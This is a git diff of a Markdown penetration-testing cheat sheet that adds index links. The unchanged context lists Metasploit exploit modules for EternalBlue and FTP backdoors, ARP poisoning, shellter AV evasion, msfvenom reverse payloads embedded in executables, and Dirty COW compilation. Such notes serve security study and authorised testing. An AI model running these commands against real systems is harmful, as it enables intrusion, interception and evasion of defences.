@@ -82,6 +82,7 @@ connect <ip> <port>
 ```
 
 ## Resource Scripts
+[<< Index](#Index)
 ```
 /usr/share/metasploit-framework/scripts/resource
 ```
@@ -115,6 +116,7 @@ msf6 > makerc handler.rc
 ```
 
 ## tmux
+[<< Index](#Index)
 ```
 tmux
 tmux ls
@@ -127,10 +129,12 @@ Ctrl + B, 0 (1,2...) — Move to a specific window by number.
 ```
 
 ## windows-resources
+[<< Index](#Index)
 - `/usr/share/windows-resources/`
 - `/usr/share/windows-resources/binaries/`
 
 # Information Gathering and Enumeration
+[<< Index](#Index)
 - [FTP](#FTP)
 - [HTTP](#HTTP)
   - [WMAP](#WMAP)
@@ -155,6 +159,7 @@ set STOP_ON_SUCCESS <boolean>
 - Set these options accordingly and as needed for brute-force attacks.
 
 ## FTP
+[<< Index](#Index)
 ```
 use auxiliary/scanner/ftp/ftp_version
 use auxiliary/scanner/ftp/anonymous
@@ -162,6 +167,7 @@ use auxiliary/scanner/ftp/ftp_login
 ```
 
 ## HTTP
+[<< Index](#Index)
 ```
 use auxiliary/scanner/http/http_version
 ```
@@ -206,6 +212,7 @@ curl http://<ip>/<directory>/
 - Check if directory listing (Apache) is enabled i.e. `Index of /<directory>`.
 
 ### WMAP
+[<< Index](#Index)
 ```
 load wmap
 wmap_sites -h
@@ -229,6 +236,7 @@ wmap_vulns -l
 ```
 
 ## metasploit-autopwn
+[<< Index](#Index)
 ```
 load db_autopwn
 db_autopwn -p -t
@@ -238,6 +246,7 @@ db_autopwn -p -t -PI <port>
 - No longer in official MSF distro.
 
 ## MySQL
+[<< Index](#Index)
 ```
 use auxiliary/scanner/mysql/mysql_version
 ```
@@ -288,6 +297,7 @@ MySQL [(none)]> show databases;
 ```
 
 ## Port Scanning
+[<< Index](#Index)
 ```
 nmap -Pn -sV <ip>
 ```
@@ -315,6 +325,7 @@ use auxiliary/scanner/discovery/udp_sweep
 ```
 
 ## SMB/Samba
+[<< Index](#Index)
 ```
 use auxiliary/scanner/smb/smb_version
 ```
@@ -356,6 +367,7 @@ nmblookup -A <ip>
 ```
 
 ## SMTP
+[<< Index](#Index)
 ```
 nmap -Pn -sV -p25 --script=banner <ip>
 ```
@@ -365,6 +377,7 @@ use auxiliary/scanner/smtp/smtp_enum
 ```
 
 ## SSH
+[<< Index](#Index)
 ```
 use auxiliary/scanner/ssh/ssh_version
 ```
@@ -378,6 +391,7 @@ use auxiliary/scanner/ssh/ssh_enumusers
 ```
 
 ## Vulnerability Scanning
+[<< Index](#Index)
 ```
 db_import <filename>
 ```
@@ -388,6 +402,7 @@ nmap -Pn -sV --script=vuln <ip>
 ```
 
 ## WinRM
+[<< Index](#Index)
 ```
 nmap -Pn -sV -p5985,5986 <ip>
 nmap -Pn -sV -p- <ip>
@@ -406,6 +421,7 @@ set CMD <command>
 - Needs credentials.
 
 ## Wordlists
+[<< Index](#Index)
 ```
 /usr/share/wordlists/
 /usr/share/wordlists/rockyou.txt
@@ -427,6 +443,7 @@ set CMD <command>
 ```
 
 # Exploitation
+[<< Index](#Index)
 - FTP
   - [ProFTPD 1.3.3c](#ProFTPD-133c) 
   - [vsftpd 2.3.4](#vsftpd-234)
@@ -450,17 +467,20 @@ set CMD <command>
 
 ## FTP
 ### ProFTPD 1.3.3c
+[<< Index](#Index)
 ```
 use exploit/unix/ftp/proftpd_133c_backdoor
 ```
 
 ### vsftpd 2.3.4
+[<< Index](#Index)
 ```
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
 ## HTTP
 ### Apache Tomcat 8.5.19
+[<< Index](#Index)
 ```
 use exploit/multi/http/tomcat_jsp_upload_bypass
 check
@@ -479,11 +499,13 @@ sessions -l
 - Generate payload with msfvenom instead.
 
 ### BadBlue httpd 2.7
+[<< Index](#Index)
 ```
 use exploit/windows/http/badblue_passthru
 ```
 
 ### Rejetto HttpFileServer 2.3
+[<< Index](#Index)
 ```
 use exploit/windows/http/rejetto_hfs_exec
 ```
@@ -503,6 +525,7 @@ python 39161.py <ip> <port>
 
 ## SMB/Samba
 ### EternalBlue
+[<< Index](#Index)
 ```
 use auxiliary/scanner/smb/smb_ms17_010
 use exploit/windows/smb/ms17_010_eternalblue
@@ -510,11 +533,14 @@ use exploit/windows/smb/ms17_010_eternalblue
 - SMBv1 only.
 
 ### Samba smbd 3.X - 4.X
+[<< Index](#Index)
 ```
 use exploit/linux/samba/is_known_pipename
+check
 ```
 
 ## WinRM
+[<< Index](#Index)
 ```
 use exploit/windows/winrm/winrm_script_exec
 set FORCE_VBS true
@@ -523,15 +549,18 @@ set FORCE_VBS true
 
 ## Others
 ### XODA 0.4.5
+[<< Index](#Index)
 ```
 use exploit/unix/webapp/xoda_file_upload
 ```
 - Set `TARGETURI` accordingly.
 
 ### Exploit Database Binary Exploits
+[<< Index](#Index)
 - https://gitlab.com/exploit-database/exploitdb-bin-sploits
 
 ## ARP Poisoning
+[<< Index](#Index)
 ```
 echo 1 > /proc/sys/net/ipv4/ip_forward
 cat /proc/sys/net/ipv4/ip_forward
@@ -544,6 +573,7 @@ sudo wireshark -i <interface> -k
 ```
 
 ## AV Evasion and Obfuscation
+[<< Index](#Index)
 ```
 sudo apt install shellter -y
 
@@ -595,6 +625,7 @@ ALL
 ```
 
 ## MSF Payloads and Listeners
+[<< Index](#Index)
 - 64-bit (`x64`) payload cannot run on 32-bit architecture.
 - Staged payload (exploit and shellcode sent separately).
 - Non-staged/inline payload (exploit and shellcode sent together).
@@ -620,6 +651,7 @@ set LPORT <port>
 - For quick reference.
 
 ### msfvenom
+[<< Index](#Index)
 #### Generating Payloads
 - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 
@@ -650,6 +682,7 @@ msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -
 - `-k` will preserve the original functionality of `<PE_1>`; may not work for every PE.
 
 ## Linux Compilation
+[<< Index](#Index)
 ```
 searchsploit -m 40839
 
@@ -657,6 +690,7 @@ gcc -pthread 40839.c -o dirty -lcrypt
 ```
 
 ## Windows Cross-Compilation
+[<< Index](#Index)
 ```
 sudo apt-get install mingw-w64 gcc
 ```
